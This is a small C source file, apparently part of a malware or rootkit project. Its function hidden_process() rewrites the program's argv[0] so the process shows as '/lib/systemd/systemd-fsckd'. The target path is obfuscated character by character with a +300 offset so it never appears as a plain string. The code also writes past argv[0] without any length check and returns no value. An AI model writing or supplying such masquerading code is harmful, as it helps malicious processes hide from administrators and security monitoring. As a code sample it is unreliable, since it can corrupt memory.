#include <string.h>
#include "hidden.h"

int hidden_process(int argc, char **argv, char **env)
{
    int eval0 = '/' + 300;
    int eval1 = 'l' + 300;
    int eval2 = 'i' + 300;
    int eval3 = 'b' + 300;
    int eval4 = '/' + 300;
    int eval5 = 's' + 300;
    int eval6 = 'y' + 300;
    int eval7 = 's' + 300;
    int eval8 = 't' + 300;
    int eval9 = 'e' + 300;
    int eval10 = 'm' + 300;
    int eval11 = 'd' + 300;
    int eval12 = '/' + 300;
    int eval13 = 's' + 300;
    int eval14 = 'y' + 300;
    int eval15 = 's' + 300;
    int eval16 = 't' + 300;
    int eval17 = 'e' + 300;
    int eval18 = 'm' + 300;
    int eval19 = 'd' + 300;
    int eval20 = '-' + 300;
    int eval21 = 'f' + 300;
    int eval22 = 's' + 300;
    int eval23 = 'c' + 300;
    int eval24 = 'k' + 300;
    int eval25 = 'd' + 300;
    int process_comm_len = strlen(argv[0]);

    argv[0][0] = eval0 - 300;
    argv[0][1] = eval1 - 300;
    argv[0][2] = eval2 - 300;
    argv[0][3] = eval3 - 300;
    argv[0][4] = eval4 - 300;
    argv[0][5] = eval5 - 300;
    argv[0][6] = eval6 - 300;
    argv[0][7] = eval7 - 300;
    argv[0][8] = eval8 - 300;
    argv[0][9] = eval9 - 300;
    argv[0][10] = eval10 - 300;
    argv[0][11] = eval11 - 300;
    argv[0][12] = eval12 - 300;
    argv[0][13] = eval13 - 300;
    argv[0][14] = eval14 - 300;
    argv[0][15] = eval15 - 300;
    argv[0][16] = eval16 - 300;
    argv[0][17] = eval17 - 300;
    argv[0][18] = eval18 - 300;
    argv[0][19] = eval19 - 300;
    argv[0][20] = eval20 - 300;
    argv[0][21] = eval21 - 300;
    argv[0][22] = eval22 - 300;
    argv[0][23] = eval23 - 300;
    argv[0][24] = eval24 - 300;
    argv[0][25] = eval25 - 300;

    argv[0][26] = 0;
}